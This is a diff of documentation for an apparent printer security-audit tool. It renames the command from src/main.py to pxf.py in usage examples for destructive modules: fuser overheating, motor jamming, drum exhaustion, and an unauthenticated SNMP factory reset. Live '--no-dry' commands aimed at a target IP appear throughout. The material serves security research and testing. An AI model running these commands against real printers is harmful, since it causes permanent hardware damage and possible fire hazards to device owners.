@@ -90,9 +90,9 @@ For Kyocera (requires service mode unlock):
 ### Module
 
 ```bash
-python src/main.py TARGET --xpl-run research-fuser-thermal-attack
+python pxf.py TARGET --xpl-run research-fuser-thermal-attack
 # or via audit:
-python src/main.py TARGET --destructive-audit --destructive-modules research-fuser-thermal-attack
+python pxf.py TARGET --destructive-audit --destructive-modules research-fuser-thermal-attack
 ```
 
 ---
@@ -150,7 +150,7 @@ Rapid alternation of duplex and page size stresses the duplex reversal mechanism
 ### Module
 
 ```bash
-python src/main.py TARGET --xpl-run research-motor-jam-attack
+python pxf.py TARGET --xpl-run research-motor-jam-attack
 ```
 
 ---
@@ -211,7 +211,7 @@ Sending 20–50 all-black 1200 DPI pages in rapid succession exhausts the photos
 ### Module
 
 ```bash
-python src/main.py TARGET --xpl-run research-laser-scanner-attack
+python pxf.py TARGET --xpl-run research-laser-scanner-attack
 ```
 
 ---
@@ -283,7 +283,7 @@ OID `prtGeneralReset` value `6` = factory reset on most MFPs. No authentication 
 ### Assess Mode (Safe — No Payloads Sent)
 
 ```bash
-python src/main.py 192.168.1.100 --destructive-audit
+python pxf.py 192.168.1.100 --destructive-audit
 ```
 
 Checks all 10 destructive modules:
@@ -296,21 +296,21 @@ Checks all 10 destructive modules:
 ### Selective Modules
 
 ```bash
-python src/main.py 192.168.1.100 --destructive-audit \
+python pxf.py 192.168.1.100 --destructive-audit \
   --destructive-modules research-fuser-thermal-attack,research-brother-nvram
 ```
 
 ### Custom Ports
 
 ```bash
-python src/main.py 192.168.1.100 --destructive-audit \
+python pxf.py 192.168.1.100 --destructive-audit \
   --port-raw 3910 --port-snmp 162 --port-http 8080
 ```
 
 ### Live Execution (AUTHORIZED LAB ONLY)
 
 ```bash
-python src/main.py 192.168.1.100 --destructive-audit --no-dry
+python pxf.py 192.168.1.100 --destructive-audit --no-dry
 ```
 
 > **Requires explicit written authorization. Hardware damage is PERMANENT.**
@@ -318,7 +318,7 @@ python src/main.py 192.168.1.100 --destructive-audit --no-dry
 ### Interactive Menu
 
 ```bash
-python src/main.py
+python pxf.py
 # → choose [D] DESTRUCTIVE AUDIT
 # → select modules (or 0 for all)
 # → choose DRY-RUN or LIVE
@@ -329,16 +329,16 @@ python src/main.py
 
 ```bash
 # Fuser thermal attack — assess
-python src/main.py 192.168.1.100 --xpl-run research-fuser-thermal-attack
+python pxf.py 192.168.1.100 --xpl-run research-fuser-thermal-attack
 
 # Fuser thermal — live (HP, 270°C)
-python src/main.py 192.168.1.100 --xpl-run research-fuser-thermal-attack --no-dry
+python pxf.py 192.168.1.100 --xpl-run research-fuser-thermal-attack --no-dry
 
 # Motor jamming — duplex stress mode
-python src/main.py 192.168.1.100 --xpl-run research-motor-jam-attack --no-dry
+python pxf.py 192.168.1.100 --xpl-run research-motor-jam-attack --no-dry
 
 # Laser scanner — drum exhaustion (20 all-black pages)
-python src/main.py 192.168.1.100 --xpl-run research-laser-scanner-attack --no-dry
+python pxf.py 192.168.1.100 --xpl-run research-laser-scanner-attack --no-dry
 ```
 
 ---
